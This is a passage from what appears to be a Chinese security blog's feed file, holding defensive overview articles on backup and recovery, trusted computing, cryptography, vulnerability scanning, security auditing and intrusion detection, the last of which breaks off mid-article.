title="3、互连技术"></a>3、互连技术</h3><p>现有多种基于IP的SAN的远程数据容灾备份技术。它们是利用基于IP的SAN的互连协议，将主数据中心SAN中的信息通过现有的TCP/IP网络，远程复制到备援中心SAN中。早期方法多通过光纤通道FC连接两个SAN，存在实现成本高、设备的互操作性差、跨越的地理距离短（10公里）等缺点。<br>当备援中心存储的数据量过大时，可利用快照技术将其备份到磁带库或光盘库中。这种基于IP的SAN的远程容灾备份，可以跨越LAN、MAN和WAN，成本低、可扩展性好，具有广阔的发展前景。<br>基于IP的互连协议包括：FCIP、iFCP、Infiniband、iSCSI等。</p><h2 id="六、备份恢复技术应用场景"><a href="#六、备份恢复技术应用场景" class="headerlink" title="六、备份恢复技术应用场景"></a>六、备份恢复技术应用场景</h2><p>备份恢复技术的应用场景有很多，以下是常见的一些场景：</p><ol><li>数据丢失应用场景：包括人为操作失误、软件BUG、硬件故障、安全漏洞被入侵等情况，导致数据被误操作、部分或全部丢失。在这种情况下，备份恢复技术可以用来恢复丢失的数据。</li><li>非数据丢失应用场景：包括特殊应用场景下基于时间点的数据恢复、开发测试环境数据库搭建、相同数据库的新环境搭建、数据库或数据迁移等情况。在这些情况下，备份恢复技术可以用来迁移数据或者在新的环境中快速搭建数据库。</li><li>设备更换场景：当用户的设备损坏或丢失时，可以通过备份恢复技术将备份的数据导入到新设备中，恢复原有的应用程序和设置，避免了重新配置和下载应用的麻烦。</li><li>数据迁移场景：当用户的设备升级或更换时，可以通过备份恢复技术将备份的数据迁移到新设备中，保留原有的数据和设置，提高用户的使用体验。</li></ol><p>备份恢复技术的应用场景非常广泛，可以在各种情况下保护数据安全，降低风险和成本。根据实际需求选择适合的备份恢复技术，可以提高企业的数据安全性和业务连续性水平。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之可信计算技术</title>
      <link href="/posts/d23a1bb5/"/>
      <url>/posts/d23a1bb5/</url>
      
        <content type="html"><![CDATA[<p>可信计算技术是一种计算机安全体系结构，旨在提高计算机系统在面临各种攻击和威胁时的安全性和保密性。它通过包括硬件加密、受限访问以及计算机系统本身的完整性验证等技术手段，确保计算机系统在各种攻击和威胁下保持高度安全和保密性。</p><h2 id="一、可信计算基本概念"><a href="#一、可信计算基本概念" class="headerlink" title="一、可信计算基本概念"></a>一、可信计算基本概念</h2><p>“可信”，这个概念由可信计算组织Trusted Computing Group（TCG）提出，旨在提出一种能够超越预设安全规则，执行特殊行为的运行实体。</p><p>操作系统中将这个实体运行的环境称为可信计算基，是计算机系统内保护装置的总体，包括硬件、固件、软件和负责执行安全策略的组合体。可信计算基建立了一个基本的保护环境，并提供一个可信计算系统所要求的附加用户服务，以防止不可信主体的干扰和篡改。</p><p>而可信计算（Trusted Computing）是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信计算平台，保证系统运行环境的可信赖。可信计算平台为网络用户提供了一个更为宽广的安全环境，它从安全体系的角度来描述安全问题，确保用户的安全执行环境。</p><p>可信计算技术的核心思想是可信，即只有当系统是可信的情况下，才能够保证安全。这主要体现在两个方面：一是系统本身的可信，即系统的所有组件都没有被篡改或替换，系统的运行环境和操作过程是可预测和可靠的；二是系统的行为可信，即系统的行为是按照预期的方式进行的，没有受到非法的干预或干扰。</p><p>在可信计算的基础上，操作或过程的行为在任意操作条件下是可预测的，并能很好地抵抗不良代码和一定的物理干扰造成的破坏。可信计算是安全的基础，从可信根出发，解决PC机结构所引起的安全问题。</p><h2 id="二、可信计算功能特征"><a href="#二、可信计算功能特征" class="headerlink" title="二、可信计算功能特征"></a>二、可信计算功能特征</h2><p>可信计算技术通过多种手段提高计算机系统的安全性，包括硬件保护、加密技术、数字签名技术、安全协议和系统完整性保护等。这些技术手段可以相互配合，形成一个完整的安全防护体系，确保计算机系统的安全性和保密性。</p><ol><li>硬件保护：可信计算技术使用安全芯片等硬件组件，在硬件层面对计算机进行保护，防止计算机系统被篡改或攻击。安全芯片可以验证计算机的识别序号，检测计算机是否被篡改，同时存储计算机的安全信息，保证用户、设备和数据的安全。</li><li>加密技术：可信计算技术使用加密技术对计算机系统中的数据进行加密，确保数据在传输和存储过程中的机密性和完整性。加密技术可以防止不良用户在通讯过程中截获加密的信息，保证数据的保密性。</li><li>数字签名技术：数字签名技术是可信计算技术的核心部分，用于在网络上进行身份验证和认证。数字签名可以验证消息的发件人是可信的，并且消息在传输过程中没有被篡改。这可以防止恶意用户伪造或篡改数据，提高系统的安全性。</li><li>安全协议：可信计算技术使用安全协议，如SSL/TLS协议等，保护在开放网络上进行的通信。这些安全协议可以防止恶意攻击者窃听或篡改通信内容，保证数据传输的安全性。</li><li>系统完整性保护：可信计算技术可以保护计算机系统的完整性，确保系统组件没有被篡改或替换。通过度量和验证等技术手段，可以检测系统组件的状态是否正常，及时发现并防止恶意代码的注入或攻击。</li></ol><p>与传统的安全技术相比，可信计算具有以下三个显著的功能特征：</p><ol><li>保护存储<br>保护存储一方面通过嵌入的硬件设备保护用户特定的秘密信息（如终端平台身份信息、密钥等），防止通过硬件物理窥探等手段访问密钥等信息，另一方面完成硬件保护下的密钥生成、随机数生成、HASH运算、数字签名以及加解密操作，为用户提供受保护的密码处理过程。</li><li>认证启动<br>可信计算技术利用完整性测量机制完成计算机终端从加电到操作系统装载运行过程中各个执行阶段（BIOS、操作系统装载程序、操作系统等）的认证。当级别低的节点认证到高一级的节点是可信时，低级别节点会把系统的运行控制权转交给高一级节点，基于这种信任链传递机制，可以保证终端始终处于可信的运行环境中。</li><li>证明<br>证明是保证信息正确性的过程。网络通信中，计算机终端基于数字证书机制可以向要通信的双方证明终端当前处于一个可信的状态，同时说明本机的配置情况。如果通信双方都能证明彼此信息的有效性，则可以继续进行通信，否则服务中断。<br>基于以上三个功能特性，可信计算技术可以对主机实施有效的安全防护，保护计算机及网络系统的安全运行，从而向用户提供一个可信的执行环境。</li></ol><h2 id="三、可信计算的应用"><a href="#三、可信计算的应用" class="headerlink" title="三、可信计算的应用"></a>三、可信计算的应用</h2><p>可信计算技术的应用范围非常广泛，它可以应用于各种计算机系统和网络设备中，提供从硬件到软件的各种安全保障。例如，可信计算技术可以用于保护计算机系统的关键组件，防止恶意代码篡改BIOS、操作系统和应用软件；还可以用于实现网络连接的安全控制，防止终端的安全状态伪造、接入后配置修改以及设备假冒接入等问题。此外，可信计算技术还可以用于构建等级保护的核心技术体系，对通信设备、边界设备、计算设备等保护对象进行系统引导程序、系统程序、重要配置参数等的验证。</p><p>可信计算为系统运行提供了一个可信赖的环境，具体来说可在以下方面得到应用：</p><ol><li>云环境：云环境需要更高的安全性，可信计算技术可以帮助提供更安全、更可信赖的云服务环境。通过可信计算技术，可以保护云服务中数据的机密性和完整性，防止数据被篡改或泄露。同时，可信计算技术还可以帮助实现虚拟专用网络（VPN）的安全传输，保证远程用户访问云服务时的身份验证和数据加密。</li><li>物联网：在物联网环境中，可信计算技术可以帮助保护各种设备和传感器的数据安全，以及确保数据的完整性和真实性。通过可信计算技术，可以防止物联网设备被攻击或篡改，保证设备的合法性和安全性。同时，可信计算技术还可以用于实现物联网设备的远程身份验证和授权控制，确保只有合法的设备可以接入网络并访问相应的数据。</li><li>数字版权管理：可信计算技术可以用于创建安全的数字版权管理系统，以防止数字内容被非法复制和分发。通过可信计算技术，可以确保数字内容的完整性和真实性，同时防止未经授权的访问和复制。这可以保护版权所有者的合法权益，防止盗版内容的传播。</li><li>金融交易：通过可信计算技术，可以保护金融交易中的数据完整性和机密性，防止交易被篡改或泄露。同时，可信计算技术还可以用于实现金融系统的远程身份验证和授权控制，保证金融交易的安全性和合法性。以网上银行为例，当用户接入到银行服务器时使用远程认证，之后如果服务器能产生正确的认证证书那么银行服务器就将只对该页面进行服务。随后用户通过该页面发送他的加密账号和PIN和一些对用户和银行都为私有的（不看见）保证信息。</li><li>身份认证和访问控制：可信计算技术可以用于实现身份认证和访问控制，保证只有合法的用户可以访问相应的数据或资源。通过可信计算技术，可以验证用户的身份和权限，防止身份假冒和非法访问。这可以提高系统的安全性，保护敏感数据不被泄露或滥用。</li><li>保护系统不受病毒和间谍软件危害：软件的数字签名将使得用户识别出经过第三方修改可能加入间谍软件的应用程序。例如，一个网站提供一个修改过的流行即时通讯程序版本，该程序包含间谍软件。操作系统可以发现这些版本里缺失有效的签名并通知用户该程序已经被修改，然而这也带来一个问题：谁来决定签名是否有效。</li><li>保护生物识别身份验证数据：用于身份认证的生物鉴别设备可以使用可信计算技术（存储器屏蔽，安全I/O）来确保没有间谍软件安装在电脑上窃取敏感的生物识别信息。</li><li>核查远程网格计算的计算结果：可信计算可以确保网格计算系统的参与者返回的结果不是伪造的。这样大型模拟运算（例如天气系统模拟）不需要繁重的冗余运算来保证结果不被伪造，从而得到想要的（正确）结论。</li></ol><h2 id="四、可信路径"><a href="#四、可信路径" class="headerlink" title="四、可信路径"></a>四、可信路径</h2><p>可信路径是一种安全机制，旨在确保只有经过授权和验证的实体能够访问特定的资源或数据。可信路径的实现通常依赖于可信计算技术，通过在系统中建立一条可信任的路径来保护数据的完整性和机密性。</p><p>可信通信机制主要应用在用户登录或注册时，能够保证用户确实是和安全核心通信，防止不可信进程如特洛伊木马等模拟系统的登录过程而窃取口令。<br>在计算机系统中，可信路径可以用于保护操作系统的引导程序、核心程序以及系统的关键配置参数等。通过建立可信路径，可以确保只有合法的实体能够修改或破坏这些关键组件，从而防止系统被篡改或攻击。</p><p>此外，在物联网环境中，可信路径可以用于确保只有经过授权的设备能够接入网络并访问相应的数据。通过建立可信路径，可以防止非法设备接入网络，从而保护物联网系统的安全性和可靠性。</p><p>可信路径是一种重要的安全机制，它可以建立一条可信任的路径来保护数据的完整性和机密性，防止系统被篡改或攻击。通过可信计算技术，可以有效地实现可信路径，提高计算机系统和物联网系统的安全性。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之密码技术</title>
      <link href="/posts/1dad343e/"/>
      <url>/posts/1dad343e/</url>
      
        <content type="html"><![CDATA[<p>密码学是信息安全的基础技术之一，是达到信息系统安全等级保护要求的核心技术支持，在身份验证、访问控制、文件加密、数据加密和安全传输中都得到广泛应用。其核心目标是保证信息的机密性、完整性和可用性。<br>密码学包括加密和解密两个部分。一般过程是：发送方通过加密算法，将可读的文件（明文）变换成不可理解的乱码，即密文，然后传输给接收方；接收方接收密文之后，通过解密算法进行解密，获得明文。密码技术的实施过程，支持等级保护在机密性、完整性、认证性和非否认性等方面的要求。</p><h2 id="一、加密技术分类"><a href="#一、加密技术分类" class="headerlink" title="一、加密技术分类"></a>一、加密技术分类</h2><p>按照密钥的特点可将密码学分为两类：对称密码算法和非对称密码算法。相应地，对数据加密的技术分为两类，即对称加密技术和非对称加密技术。</p><h3 id="1、对称加密技术"><a href="#1、对称加密技术" class="headerlink" title="1、对称加密技术"></a>1、对称加密技术</h3><p>对称加密技术的基本特征是加密密钥和解密密钥相同，典型代表是数据加密标准（DES）、国际数据加密算法（IDEA）。实施过程如下：<br>（1）发送方发送明文消息前，首先获得一个密钥，该密钥可以由发送方生成并通过安全的渠道送到接收方，或者由可信的第三方生成，分发给发送方和接收方；<br>（2）发送方使用密钥将要发送的消息加密并传输给接收方；<br>（3）接收方接收密文，使用密钥进行解密获得明文。<br>对称加密算法使用起来简单快捷，加密、解密处理速度快、保密度高，适合对数据量比较大的文件进行加密。但是在密钥管理与分发、数字签名等方面存在较为明显的问题：<br>（1）会话双方密钥难以统一；在多人通信时，同时产生的密钥数量庞大，难以管理。<br>（2）密钥必须妥善安全地发送到接收方，分发过程十分复杂，花费代价高。<br>（3）密钥不具有唯一性，易于伪造。<br>国产对称加密算法包括SM1、SM4等。<br>SM1是国家密码管理局公布的分组密码，主要应用于SSL/TLS握手过程中的DH密钥交换，也可用于数据加密和数字签名。<br>SM4是一种分组密码，其分组长度为128位，密钥长度为128位、192位或256位。SM4算法基于Feistel结构，具有较高的安全性。</p><h3 id="2、非对称加密技术"><a href="#2、非对称加密技术" class="headerlink" title="2、非对称加密技术"></a>2、非对称加密技术</h3><p>非对称加密技术的原理是加密密钥和解密密钥不同，其中一个密钥用来加密，另一个密钥用来解密，典型代表是RSA算法。非对称加密技术通过特定的算法生成一个密钥对，一个密钥不能公开，叫做私钥，另一个可以公开，叫做公钥。同时，非对称加密技术的加密算法和解密算法是公开的，具体实施过程如下：<br>（1）发送方通过私钥和加密算法对发送的消息进行加密，然后传输；<br>（2）接收方接收密文，使用发送方公开的公钥和解密算法进行解密，获得明文。<br>非对称加密体制相对对称加密体制而言，具有以下优势：<br>（1）消除了会话用户双方交换密钥的需要。<br>（2）每个用户拥有特定的密钥，密钥数量少，便于管理，同时实现了身份认证。<br>但是非对称加密体制加密和解密花费时间长、速度慢，不适合对数据量比较大的文件加密，更适用于对少量数据进行加密。<br>国产非对称加密算法主要包括SM2和SM9。<br>SM2算法是一种基于椭圆曲线密码的公钥密码算法标准，其安全性相较于RSA算法更高，且具有更高的运算速度，适用于数字签名、密钥协商和加密等场景。SM2算法已成为我国无线局域网国家标准的商用密码算法，并被应用于WAPI无线网络中。<br>SM9算法则是一种基于标识的密码算法，将用户的身份标识作为公钥，从而省去了证书管理的复杂性。SM9算法包括数字签名、密钥交换和密钥封装等协议，可以应用于多种安全场景，如网络安全、移动支付等。</p><h2 id="二、密码技术在安全防御中的作用"><a href="#二、密码技术在安全防御中的作用" class="headerlink" title="二、密码技术在安全防御中的作用"></a>二、密码技术在安全防御中的作用</h2><p>在安全防御中，密码技术的主要作用如下：</p><ol><li>信息加密：通过加密算法将明文信息转换为密文信息，保证信息在传输过程中不被窃取或篡改。常见的加密算法包括对称加密算法（如AES、DES、SM1、SM4）和非对称加密算法（如RSA、ECC、SM2、SM9）。</li><li>数字签名：利用密码技术对数据进行签名，验证数据的完整性和来源。数字签名可以防止数据被篡改或伪造，广泛应用于身份认证、电子签章等领域。</li><li>身份认证：通过密码技术对用户进行身份验证，确保只有合法用户能够访问敏感数据或资源。常见的身份认证方式包括用户名/密码认证、动态令牌认证、多因素认证等。</li><li>访问控制：利用密码技术对访问者进行权限控制，确保只有授权用户能够访问特定资源。访问控制通常与身份认证相结合，实现基于角色的访问控制（RBAC）。</li><li>安全审计：通过密码技术记录和审计安全事件，及时发现和应对安全威胁。安全审计可以帮助组织机构了解其安全状况，发现潜在的安全风险，并及时采取措施进行防范。</li></ol><p>密码技术在安全防御中扮演着至关重要的角色。通过合理应用密码技术，可以有效提高组织机构的信息安全水平，保护敏感数据和资源的安全。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之漏洞扫描技术</title>
      <link href="/posts/a57e826e/"/>
      <url>/posts/a57e826e/</url>
      
        <content type="html"><![CDATA[<p>每年都有数以千计的网络安全漏洞被发现和公布，加上攻击者手段的不断变化，网络安全状况也在随着安全漏洞的增加变得日益严峻。寻根溯源，绝大多数用户缺乏一套完整、有效的漏洞管理工作流程，未能落实定期评估与漏洞修补工作。只有比攻击者更早掌握自己网络安全漏洞并且做好预防工作，才能够有效地避免由于攻击所造成的损失。</p><p>什么是漏洞及漏洞的管理参见博客《<a href="http://xiejava.ishareread.com/posts/a937cbf5/" target="_blank" rel="noopener">安全运营之漏洞管理</a>》，本文介绍安全防御中的漏洞扫描技术来发现漏洞。</p><p>安全防御中的漏洞扫描技术是网络安全防护体系中一项核心的预防性措施，用于自动检测网络、系统和服务中的潜在弱点和已知安全漏洞。这项技术帮助企业、组织和个人识别出可能被攻击者利用的风险点，并采取相应的补救措施以强化其整体安全态势。</p><p>漏洞扫描通过针对常见黑客攻击手法的检查策略，定期对网络系统进行扫描分析，及时发现问题、给出相关安全措施和建议并进行相应的修补和配置，这项技术的具体实现就是安全扫描程序，在很短的时间内查出现存的安全脆弱点。</p><p>安全漏洞扫描技术可以分为被动和主动两种方式。被动扫描是指在不影响系统正常运行的情况下，通过分析系统的网络流量、系统日志和配置信息等，来发现潜在的安全漏洞。主动扫描则是通过模拟攻击的方式，对系统进行深入的探测和漏洞发现。</p><p>被动扫描和主动扫描它们各有优缺点。</p><ol><li>被动扫描是指在不影响系统正常运行的情况下，通过分析系统的网络流量、系统日志和配置信息等，来发现潜在的安全漏洞。被动扫描的优点在于不会对目标系统造成干扰或损害，可以避免触发恶意软件或警报器。同时，被动扫描可以实时监测系统的安全状况，及时发现新的漏洞和攻击。然而，被动扫描的缺点在于无法发现未知的漏洞和攻击，因为它是基于已知的安全漏洞库和规则进行扫描的。</li><li>主动扫描则是通过模拟攻击的方式，对系统进行深入的探测和漏洞发现。主动扫描可以发现未知的漏洞和攻击，因为它是通过模拟攻击来发现系统中的弱点。主动扫描的优点在于可以更加深入地探测系统中的安全漏洞，包括缓冲区溢出、SQL注入等。同时，主动扫描还可以评估系统的防御策略和应急响应措施的有效性。然而，主动扫描的缺点在于可能会对目标系统造成干扰或损害，需要谨慎操作，避免对系统造成不必要的风险。</li></ol><p>被动扫描和主动扫描各有优缺点，需要根据实际情况选择使用。在某些情况下，可能需要结合使用被动扫描和主动扫描，以提高系统的安全性。<br>安全漏洞扫描技术可以自动化进行，也可以手动执行。自动化扫描工具可以根据预定义的漏洞库和扫描规则，自动对目标系统进行扫描和漏洞发现。手动扫描则需要专业的安全人员对系统进行逐一检查和分析。</p><p>常见漏洞扫描工具的特点：</p><ul><li>智能识别：能够对扫描结果数据进行在线分析，能够根据端口、漏洞、BANNER信息、IP地址等关键字对主机信息进行查询并能将查询结果保存。</li><li>高效快捷：支持高级数据分析，能够进行历史数据查询、汇总查看、对比分析等，方便进行多个扫描任务或多个IP风险对比，能够在多个历史任务中，很快的检索到需要关注的资产IP点。</li><li>脚本依赖：扫描模块会自动根据其逻辑依赖关系执行而不是无目的盲目执行，从而提高了扫描准确性。</li><li>信息输出：漏洞分析报告应提供在线浏览报告和离线打印报告;离线报表提供针对不同角色的默认模板，允许用户定制报告的内容、报告的格式等。</li><li>断点恢复：在扫描程序运行到一半的时候如果系统意外掉电等，可以通过查看扫描状态进行重新扫描或者继续扫描，如果选择继续扫描的话，前面扫描到的结果会保留下来和后面的结果一起合并生成结果文件。</li></ul><p>安全漏洞扫描技术可以针对不同的层次进行扫描，例如网络层、操作系统层和应用层等。网络层扫描主要是检查网络设备和通信线路的安全性，操作系统层扫描主要检查操作系统的配置和漏洞，应用层扫描则针对具体的软件应用程序进行安全检查。基于网络的安全扫描主要扫描设定网络内的服务器、路由器、网桥、变换机、访问服务器、防火墙等设备的安全漏洞，并可设定模拟攻击，以测试系统的防御能力。通常该类扫描器限制使用范围（IP地址或路由器跳数）。</p><p>安全漏洞扫描技术是一类重要的网络安全技术。它和防火墙、入侵检测系统互相配合，能够有效提高网络的安全性。通过对网络的扫描，网络管理员能了解网络的安全设置和运行的应用服务，及时发现安全漏洞，客观评估网络风险等级。网络管理员能根据扫描的结果更正网络安全漏洞和系统中的错误设置，在黑客攻击前进行防范。如果防火墙和网络监视系统是被动的防御手段，那么安全扫描就是一种主动的防范措施，能有效避免黑客攻击行为，做到防患于未然。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之安全审计技术</title>
      <link href="/posts/f2bbe1ed/"/>
      <url>/posts/f2bbe1ed/</url>
      
        <content type="html"><![CDATA[<p>安全防御中的安全审计技术是保障信息系统安全的重要手段之一。其主要目标是对信息系统及其活动进行记录、审查和评估，以确保系统符合安全策略、法规要求，并能够及时发现潜在的安全风险和异常行为。通过安全审计，可以对系统中的各种活动进行记录、检测和监控，以发现潜在的安全风险和威胁，并及时采取相应的措施进行防范和处理。</p><p>安全审计是对访问控制的必要补充，是信息安全的另一个基础技术机制。审计会对用户使用何种信息资源、使用的时间，以及如何使用（执行何种操作）进行记录与监控。审计和监控是实现系统安全的最后一道防线，处于系统的最高层。审计与监控能够再现原有的进程和问题，这对于责任追查和数据恢复非常有必要。</p><p>审计跟踪是系统活动的流水记录。该记录按事件从始至终的途径，顺序检查、审查和检验每个事件的环境及活动。审计跟踪通过书面方式提供应负责任人员的活动证据以支持访问控制职能的实现（职能是指记录系统活动并可以跟踪到对这些活动应负责任人员的能力）。</p><p>审计跟踪记录系统活动和用户活动。系统活动包括操作系统和应用程序进程的活动；用户活动包括用户在操作系统中和应用程序中的活动。通过借助适当的工具和规程，审计跟踪可以发现违反安全策略的活动、影响运行效率的问题以及程序中的错误。审计跟踪不但有助于帮助系统管理员确保系统及其资源免遭非法授权用户的侵害，同时还能提供对数据恢复的帮助。</p><p>安全审计技术主要包括以下几个方面的内容：</p><ol><li>日志审计：通过收集、分析和审计系统中的日志信息，对系统的运行状态、安全事件和异常行为进行监测和报警。常见的日志包括系统日志、安全日志、网络日志等。</li><li>行为审计：对网络中的主机、设备、应用程序等的行为进行监测和审计，以发现异常行为和潜在的安全威胁。行为审计可以通过网络流量分析、主机监控等方式实现。</li><li>入侵检测：通过实时监测网络流量和系统活动，发现潜在的入侵行为和恶意攻击，并及时采取相应的措施进行防范和处理。入侵检测可以采用基于规则的模式或基于行为的模式。</li><li>安全审计平台：通过建立统一的安全审计平台，实现对各类安全事件的集中管理和分析。安全审计平台可以集成各种审计工具和设备，提供全面的安全审计服务。<br>更多关于日志审计分析平台的介绍请参考《<a href="http://xiejava.ishareread.com/posts/6a8b36cb/" target="_blank" rel="noopener">网络安全之认识日志采集分析审计系统</a>》</li></ol><p>安全审计的核心在于对与安全有关的活动的操作信息进行识别、记录、存储和分析。同时可以辅助其他的一些安全措施，比如防止恶意刷新，危险IP过滤等。通过审计记录的分析，可以知道网络上发生了哪些与安全有关的活动，哪个用户应该对这个活动负责。<br>根据安全审计的对象、范围和层次不同，可以分为：</p><ul><li>对服务器的安全审计：审计服务器的安全漏洞，监控对服务器的任何合法和非法操作，以便发现问题后查找原因。</li><li>对用户电脑的安全审计：为了安全目的，审计用户电脑的安全漏洞和入侵事件；为了防泄密和信息安全目的，监控上网行为和内容，以及向外拷贝文件行为；为了提高工作效率目的，监控用户非工作行为。</li><li>对数据库的安全审计：对合法和非法访问进行审计，以便事后检查。</li><li>对应用系统的安全审计：应用系统的范围较广，可以是业务系统，也可以是各类型的服务软件。这些软件基本都会形成运行日志，我们对日志进行收集，就可以知道各种合法和非法访问。</li><li>对网络安全设备的安全审计：网络安全设备包括防火墙、网闸、IDS/IPS、灾难备份、VPN、加密设备、网络安全审计系统等等，这些产品都会形成运行日志，我们对日志进行收集，就能统一分析网络的安全状况。</li></ul><p>在安全审计技术的实际应用中，需要注意以下几个方面：</p><ol><li>全面覆盖：安全审计应覆盖系统的各个方面，包括网络、主机、应用程序等，不留死角。</li><li>实时监测：安全审计应具备实时监测和报警功能，及时发现和处理安全事件。</li><li>准确性：安全审计应具备高准确性，避免误报和漏报。</li><li>可扩展性：随着系统的规模和复杂性的增加，安全审计应具备可扩展性，能够适应不同规模和类型的系统。</li><li>合规性：安全审计应符合相关法律法规和标准的要求，确保审计结果的合法性和合规性。</li></ol><p>安全防御中的安全审计技术是保障信息系统安全的重要手段之一，通过全面覆盖、实时监测、准确性、可扩展性和合规性等方面的要求和实践，可以有效提高信息系统的安全性和可靠性。随着技术的发展，现代安全审计趋向于自动化、智能化和一体化，结合大数据分析、机器学习和人工智能技术，能够更高效地处理海量安全事件，提高审计准确性和及时性，为企业的安全防御提供有力支撑。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之入侵检测与防范技术</title>
      <link href="/posts/48309864/"/>
      <url>/posts/48309864/</url>
      
        <content type="html"><![CDATA[<p>安全防御中的入侵检测与防范技术主要涉及到入侵检测系统（IDS）和入侵防御技术（IPS）。<br>入侵检测系统（IDS）是一种对入侵行为自动进行检测、监控和分析的软件与硬件的组合系统。IDS通过从计算机网络或系统中的若干关键点收集信息，并对其进行分析，从中发现网络或系统中是否有违反安全策略的行为和遭到攻击的迹象。<br>入侵防御技术（IPS）是一种主动的安全防御技术，旨在防止恶意软件入侵和数据泄露。它通过实时监测和拦截网络流量中的威胁，保护网络和系统免受攻击。</p><h2 id="一、入侵检测技术（IDS）"><a href="#一、入侵检测技术（IDS）" class="headerlink" title="一、入侵检测技术（IDS）"></a>一、入侵检测技术（IDS）</h2><h3 id="1、入侵检测技术的定义"><a href="#1、入侵检测技术的定义" class="headerlink" title="1、入侵检测技术的定义"></a>1、入侵检测技术的定义</h3><p>通过对计算机网络或计算机系统中的若干关键点收集信息并进行分析，从中发现网络或系统中是否有违反安全策略的行为和被攻击的迹象，进行入侵检测的软件与硬件的组合就是入侵检测系统（IDS）。入侵检测系统（IDS）是一种用于检测、记录和响应计算机系统或网络中未授权活动的软件或硬件工具。它通过实时监控和分析网络流量、系统日志等信息，发现潜在的入侵行为，并及时采取相应的措施来应对。</p><p>IDS执行一般分为三个步骤，依次为信息收集、数据分析、响应（被动响应和主动响应）。</p><ul><li>信息收集：IDS信息收集的内容包括系统、网络、数据及用户活动的状态和行为，信息一般来自系统日志、目录以及文件中的异常改变、程序执行中的异常行为及物理形式的入侵信息四个方面。 </li><li>数据分析：数据分析是IDS的核心。它首先构建分析器，把收集到的信息经过预处理，建立一个行为分析引擎或模型，然后向模型中植入时间数据，在知识库中保存植入数据的模型。数据分析一般通过模式匹配、统计分析和完整性分析3种手段进行，模式匹配和统计分析用于实时入侵检测，而完整性分析则用于事后分析。常用于数据分析的有五种统计模型： 操作模型、方差、多元模型、马尔柯夫过程模型、时间序列分析。</li><li>响应：IDS在发现入侵后会及时作出响应，包括切断网络连接、记录事件和报警等。响应一般分为主动响应和被动响应，主动响应主要来阻止攻击或影响进而改变攻击的进程，由用户驱动或系统本身自动执行，可对入侵者采取断开连接等行动、修正系统环境或收集有用信息；被动响应主要是报告和记录所检测出的问题，包括告警和通知、简单网络管理协议（SNMP）陷阱和插件等。IDS还可以与其他安全系统集成，如防火墙、反病毒软件等，以提供更全面的安全防护。</li></ul><h3 id="2、入侵检测技术的发展趋势和发展历史"><a href="#2、入侵检测技术的发展趋势和发展历史" class="headerlink" 